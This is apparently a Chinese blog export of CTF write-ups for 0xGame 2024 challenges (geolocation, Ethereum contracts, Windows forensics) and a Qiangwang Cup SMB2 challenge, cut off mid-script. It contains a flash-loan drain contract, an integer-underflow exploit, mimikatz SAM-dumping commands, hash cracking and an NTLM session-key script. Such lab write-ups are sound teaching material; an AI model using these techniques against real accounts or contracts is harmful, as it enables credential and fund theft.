aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039211-e2bccf95-0314-4cb1-b842-84e86119462c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>其实不难看出来，底下还有个google的logo没能删掉，这个地方其实可以在googlemap上找到原图。将图片放大，可以看到远处建筑物上标着的super stbernard，在google map上一搜就有。位置差不多在45.90°N，7.19°E左右。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039439-56cf623b-ea8f-459a-adbd-6090d85977c9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以查看实景</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039766-63e8739d-7f7e-4818-bee6-5277f8aada3c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>国家是瑞士不用多说，剩下的可以在<ahref="https://zh.wikipedia.org/wiki/瑞士城市列表">维基百科</a>上找到，改成英文即可</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1729496039879-b9b181ee-f9e0-4f73-90cf-101503a7bfa5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{Switzerland_Valais_Entremont_Bourg-Saint-Pierre}</p><h2 id="blockchain">Blockchain</h2><h3 id="肘上链">肘，上链！*</h3><p>出题时用的是github上的<ahref="https://github.com/chainflag/solidity-ctf-template/tree/401c6c470acdeada5eb64ba5bc258a85c503f43c">solidctf</a>项目，所以nc那边传完一次就断就不要拷打我了o(╥﹏╥)o</p><p>先nc创建账户</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912624735-18388018-e88f-4cdc-abc2-5a937e74ee03.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿给的账号去水龙头上接一下水</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912625208-5fe4b9dc-a87c-472a-958c-84f7af5c0d25.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>部署题目合约</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912625378-4cda8e9b-65b0-4bcd-b269-2c7305d4f617.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开metamask（一个浏览器插件），如下图连接到RPC，其中链ID随便填一个它就会告诉你正确的链ID</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912625196-76cd899a-2417-4c10-8b2f-2a5066ee6f09.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>切换到该网络，拿自己的账户也去水龙头上接一下水</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912625278-21646646-c154-4558-8aff-55a3795288a1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取一下题目合约</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912625381-4745037b-e25c-4ca7-9fe6-4b0de94d873e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开<ahref="https://remix.ethereum.org/">remix</a>，这里新建一个文件，把题目合约复制过去</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912627380-67d425d2-0b89-41c0-9555-c662c9e0df00.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>选择相应的版本，编译合约</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912627784-9dbc9b55-908e-4383-bdb0-046067fba524.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Environment中选择Injected Provider -MetaMask，注意metamask的小窗口要点开看一下是否连接成功</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912627408-f4fa0a7d-65bc-4daf-8b43-606569e700a4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将前面nc时给的合约地址复制过来到At Address里面，点击At Address</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912627406-e6f814b4-2dc5-410f-9c34-a9b471e119d5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>题目的合约代码很简单，要求传的值需要与"Hello0xBlockchain"的keccak256哈希值相同，这里用web3py计算一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line">s=b&quot;Hello0xBlockchain&quot;</span><br><span class="line">w3 = Web3()</span><br><span class="line">hash_bytes = w3.keccak(s)</span><br><span class="line">hash_hex = hash_bytes.hex()</span><br><span class="line">print(hash_hex)</span><br></pre></td></tr></table></figure><p>得到的结果复制到sign里面，前面记得加上0x，然后点击sign，中间有个交易的对话框，确认一下</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912627608-ae23158a-a906-4dcb-b3ad-8572b828b37b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>点击isSolved，看到值已经返回了true</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912628021-d06a3d0f-311b-44e8-a3a1-b9d22c7e8a4f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>回到nc那边，get flag</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1728912628025-45d879a5-0f85-4af1-ba10-6b13b11577a3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="theft">theft</h3><p>通过在execute中执行deposit，来替代还款，从而可以达到借了就还但是自己的余额越来越多</p><p>Exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface FlashLoan &#123;</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw() external;</span><br><span class="line">    function flashLoan(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    FlashLoan public FL;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) &#123;</span><br><span class="line">        FL = FlashLoan(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        for(int i = 0; i &lt; 9; i++)&#123;</span><br><span class="line">            FL.flashLoan(100 ether);</span><br><span class="line">        &#125;</span><br><span class="line">        FL.flashLoan(99 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        FL.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先ataddress部署Setup.sol获取target地址，然后填入构造函数部署再调用attack即可</p><h3 id="我哪来那么多臭钱">我哪来那么多臭钱？？*</h3><p>具体的部署等操作这里就不再赘述了，详见week1的wp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract Challenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balance;</span><br><span class="line">    bool public solve;</span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function Get() public &#123;</span><br><span class="line">        balance[msg.sender] = 50;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Transfer(address to, uint256 amount) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Man!&quot;);</span><br><span class="line">        require(balance[msg.sender] &gt; 0, &quot;What can I say&quot;);</span><br><span class="line">        require(balance[msg.sender] - amount &gt; 0, &quot;Mamba out!&quot;);</span><br><span class="line">        require(uint160(msg.sender) % (16*16) == 239, &quot;Sometimes I ask myself, who am i?&quot;);</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">        balance[to] += amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check() public &#123;</span><br><span class="line">        require(balance[msg.sender] == 114514);</span><br><span class="line">        solve=true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return solve;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来看合约代码。Get函数为初始化balance为50，check函数为检查余额是否为114514，当余额为114514时，isSolved函数返回true。</p><p>主要是Transfer函数，用于向某个地址转账，但这里做了一系列的限制。要求转账金额、转账前余额、转账后余额都大于0，另外要求当前发起转账的用户地址后两位为ef。</p><p>这里有两个考点，一个是整数溢出，我们可以注意到solidity版本为0.7.0，balance和amount的类型都为uint256，即数据大小在0~2**256之间。代码中有balance[msg.sender]- amount &gt; 0的要求，但是如果amount &gt;balance[msg.sender]，那么会发生什么？显然值并不会变为负数，这里值会直接变成2**256- amount +balance[msg.sender]。因此，我们只要使amount的值为2**256-114514+50即可。这里其实有些师傅是想复杂了。</p><p>另外一个考点其实是虚荣地址（vanityaddress），也就是后来给的hint中所指的。虚荣地址就是用户自己生成的具有某一特殊组合的地址，google一下其实不难找到有一个在线网站https://vanity-eth.tk/可以生成虚荣地址，如下图所示。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638728-327e8e05-2164-421e-b8c2-81309a7811f7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>但其实自己或者让GPT帮忙搓一个脚本其实也不难（出题人问GPT一次就成功了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> eth_account <span class="keyword">import</span> Account</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_address_ending_with_ef</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        private_key = <span class="string">&#x27;0x&#x27;</span> + secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">        account = Account.from_key(private_key)</span><br><span class="line">        address = account.address</span><br><span class="line">        <span class="keyword">if</span> address.endswith(<span class="string">&#x27;ef&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> private_key, address</span><br><span class="line">private_key, address = find_address_ending_with_ef()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Private Key: <span class="subst">&#123;private_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Address: <span class="subst">&#123;address&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>接下来导入私钥就可以用了。</p><p>先get</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638944-325a6559-7d5c-4154-8f44-d22f7e27c3c7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后transact，to的地址随便填就行</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638960-23d069d1-2007-4f70-9ffb-c17ea52de29c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再check，可以看到isSolved返回了true</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130639090-ebecaa01-9f1c-494e-901d-6387685072fe.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到flag</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130639424-f594014e-b307-47db-ae07-36214572457e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="forensics">Forensics</h2><h3 id="画画的baby">画画的baby</h3><p>附件给了一个内存文件，本题直接用volatility2或volatility3都能完成</p><p>volatility2：</p><p>先找到内存的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw imageinfo</span><br></pre></td></tr></table></figure><p>之后经过一些尝试，在查看进程的时候可以发现有一个<code>mspaint.exe</code>的进程，查阅资料可以知道这是windows自带的一个画图软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 pslist</span><br><span class="line">......</span><br><span class="line">0xffffe70970c0c340 mspaint.exe            5372   3912      7        0      1      0 2024-09-06 14:36:00 UTC+0000</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>把对应的进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.py -f painting.raw --profile=Win10x64_19041 memdump -p 3912 -D ./</span><br></pre></td></tr></table></figure><p>改后缀为<code>.data</code>，再用gimp打开调调宽高和位移就能看到当时的画：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638260-0f5f65e1-33f1-4fb8-be8e-7e4d29b0c1ab.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>volatility3:</p><p>操作其实都差不多，不过volatility3不需要指定windows的profile：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.pslist</span><br><span class="line">......</span><br><span class="line">5372    3912    mspaint.exe     0xe70970c0c340  7       -       1       False   2024-09-06 14:36:00.000000      N/A     Disabled</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>再把进程提取到当前目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f painting.raw windows.memmap --pid 5372 --dump</span><br></pre></td></tr></table></figure><p>gimp调位移和宽高：</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730130638768-b236d4dc-31cf-48b1-9f8a-c25f92b01f43.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p><h3 id="fbi-open-the-door-1">FBI Open The Door!! 1*</h3><blockquote><p>实际上，这几题如果用取证大师软件自动取证的话会方便许多，但出题人的预期是希望大家也能了解了解如何手动去进行这些取证，因此下面会放取证大师和手动取证两种做法。当然手动取证除了下面给出的方法以外还有很多，欢迎师傅们前来探讨。</p></blockquote><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644424-a5f29b98-5285-4776-8008-70a6ff866431.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将检材下载下来求一下SHA256校验值即可</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644383-8db2fe63-3e4d-4480-a4c9-0a65180fc34c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{6d393b09ac01accf27bce07a9c07f5721b9e1e1fd5de1cc8cc1a2581a43e68f5}</p><h3 id="fbi-open-the-door-2">FBI Open The Door!! 2*</h3><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644457-004db25d-16f6-4d8d-8f42-60ad7bc34975.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="法一">法一</h4><p>取证大师一把梭</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644587-a13ec229-1b63-402a-9c66-7e8b1699bab8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{F1sh1ng-s3v3r}</p><h4 id="法二">法二</h4><p>使用FTK Imager打开：file--&gt;Add Evidence Item--&gt;ImageFile--&gt;Browse选择文件--&gt;Finish</p><p>在C:.evtx</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644955-c86b739b-09d8-4cb9-85ae-598e9ba37364.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打开日志文件，查看事件ID为6011的日志，发现有一条修改主机名的记录，得到主机名</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644949-c913143e-9bb0-4a8b-b64f-b09722b9b40c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{F1sh1ng-s3v3r}</p><h3 id="fbi-open-the-door-3">FBI Open The Door!! 3*</h3><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645036-1162dc1d-5338-4541-944c-92d54a394d7c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="法一-1">法一</h4><p>取证大师可以直接梭出用户St5rr的NTLM hash</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805644951-7dacc63c-5453-4859-b50f-90cd69df1225.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>cmd5上查一下就有</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645161-02a54f7a-e6c8-460d-87a9-ccd73b41ada9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{zaq!xsw@}</p><h4 id="法二-1">法二</h4><p>用ftk，在C:，导出</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645524-1f1b45f0-56ca-41f7-82f9-adf7dc9b9922.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645572-a6b82b41-3ca7-45a3-81dd-015d6c4a93c2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来使用一个叫作<ahref="https://github.com/gentilkiwi/mimikatz">mimikatz</a>的工具提取NTLMHash。</p><p>运行的时候记得以管理员权限运行，然后依次运行下面两行神奇命令就能得到用户的NTLMHash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645600-dfd01aaa-fe3f-49ec-baed-cb2db86992ba.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>查cmd5</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645588-e179f20c-9aa3-47c7-876a-706c5b93fff7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{zaq!xsw@}</p><h3 id="fbi-open-the-door-4">FBI Open The Door!! 4*</h3><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805645621-1c89dc55-624d-4dfa-bc08-e5981a7a1c49.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="法一-2">法一</h4><p>取证大师一把梭</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646098-7ea3410c-3834-4fca-ae3a-2cd0e90ecd5d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{2024-10-23 14:50:40}</p><h4 id="法二-2">法二</h4><p>用ftk，在C:，导出</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646126-93c4cf47-8e2a-4b30-9df9-6794d706d54c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用kali自带的chntpw查看，用下面的两条奇妙命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chntpw -e SOFTWARE</span><br><span class="line">ls Microsoft\Windows NT\CurrentVersion</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646207-1cd1c29a-eb21-446c-a849-167c74cfba77.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到InstallDate，是以时间戳的形式表示的，使用<ahref="https://tool.lu/timestamp/">在线工具</a>进行转换，得到系统安装时间</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646152-98b761fc-391b-4b82-b6d4-c5bc203d4450.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{2024-10-23 14:50:40}</p><h3 id="fbi-open-the-door-5">FBI Open The Door!! 5*</h3><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646135-feb24c6a-7809-48eb-a6aa-b769b132ae95.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以在C:，将其导出。取证大师中的话可以更快找到这个路径。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646972-8ee81990-54af-4552-adab-e011c4277820.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在接下来的步骤前，建议去了解一下gophish</p><p>文件夹中有个gophish.db，用navicat看一下</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646866-9fc719e8-ac25-4f96-acda-6c0254776258.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在smtp表中找到password字段，这就是smtp授权码</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646930-3b5e372b-2c80-42c0-9df6-5494a3c31fef.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{wpdqlnyvetqyddce}</p><h3 id="fbi-open-the-door-6">FBI Open The Door!! 6*</h3><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805646951-f88bd439-01b0-4467-a5bd-e4aa03d7e50f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接上一题，查看users表中的hash字段，这就是登录密码的哈希</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805647059-85491922-b06f-4245-b4b3-12915db1c3a9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>网上搜索一下可以知道，这是bcrypthash，明文肯定是弱口令，用hashcat或者jtr爆破一下就行，下面用jtr。将哈希值存成一个名为1.hash的文件，字典使用rockyou.txt。</p><figure><imgsrc="/images/0xGame2024-Misc-Official-Writeup/1730805647497-a3ab4d75-c4bc-4aa2-9172-c4b737789ed9.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>0xGame{qwertyuiop}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2024 Misc 谍影重重5.0 Writeup</title>
      <link href="/posts/829c310c/"/>
      <url>/posts/829c310c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次是跟hyperion打的，除了签到题就做了这一题，另有一题跟队友合作完成，这里就不放wp了<del>（我没写）</del></p></blockquote><h2 id="谍影重重5.0">谍影重重5.0</h2><p>可以看到有很多被加密的SMB2流量</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805765590-1fad5624-fbad-423b-bc56-c3d2ae528739.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>参考<ahref="https://blog.nflabs.jp/entry/2022/12/12/094816">这篇文章</a></p><p>首先把NTLM hash提取出来，这里我用NTLMRawUnHide这个工具</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805765757-b609ab05-8ace-4168-8537-8e6537ba628a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用hashcat爆破出明文密码babygirl233</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805765626-839aa03a-e60b-4310-8180-9293103748e8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>算一下nt</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805765593-3c21cc1d-db95-4b00-a1e4-f6b6a9a3074a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找到session key和ntproofstr</p><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766211-2a1f4c6f-5c58-4ebc-8575-b31ee2f7aa50.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/强网杯2024-Misc-谍影重重5-0-Writeup/1730805766232-ea64954f-dd65-4df9-bfdb-57dc4a2259a1.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用脚本算得random sk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import hmac</span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">#stolen from impacket. Thank you all for your wonderful contributions to the communitytry:</span><br><span class="line">    from Cryptodome.Cipher import ARC4</span><br><span class="line">    from Cryptodome.Cipher import DES</span><br><span class="line">    from Cryptodome.Hash import MD4</span><br><span class="line">except Exception:</span><br><span class="line">    LOG.critical(&quot;Warning: You don&#x27;t have any crypto installed. You need pycryptodomex&quot;)</span><br><span class="line">    LOG.critical(&quot;See https://pypi.org/project/pycryptodomex/&quot;)</span><br><span class="line"></span><br><span class="line">def generateEncryptedSessionKey(keyExchangeKey, exportedSessionKey):</span><br><span class="line">   cipher = ARC4.new(keyExchangeKey)</span><br><span class="line">   cipher_encrypt = cipher.encrypt</span><br><span class="line"></span><br><span class="line">   sessionKey = cipher_encrypt(exportedSessionKey)</span><br><span class="line">   return sessionKey</span><br><span class="line">###</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=&quot;Calculate the Random Session Key based on data from a PCAP (maybe).&quot;)</span><br><span class="line">parser.add_argument(&quot;-u&quot;,&quot;--user&quot;,required=True,help=&quot;User name&quot;)</span><br><span class="line">parser.add_argument(&quot;-d&quot;,&quot;--domain&quot;,required=True, help=&quot;Domain name&quot;)</span><br><span class="line">#parser.add_argument(&quot;-p&quot;,&quot;--password&quot;,required=True,help=&quot;Password of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-H&quot;,&quot;--hash&quot;,required=True,help=&quot;NTLM hash of User&quot;)</span><br><span class="line">parser.add_argument(&quot;-n&quot;,&quot;--ntproofstr&quot;,required=True,help=&quot;NTProofStr. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-k&quot;,&quot;--key&quot;,required=True,help=&quot;Encrypted Session Key. This can be found in PCAP (provide Hex Stream)&quot;)</span><br><span class="line">parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, action=&quot;store_true&quot;, help=&quot;increase output verbosity&quot;)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">#Upper Case User and Domain</span><br><span class="line">user = str(args.user).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line">domain = str(args.domain).upper().encode(&#x27;utf-16le&#x27;)</span><br><span class="line"></span><br><span class="line">#Create &#x27;NTLM&#x27; Hash of password#passw = args.password.encode(&#x27;utf-16le&#x27;)#hash1 = hashlib.new(&#x27;md4&#x27;, passw)#password = 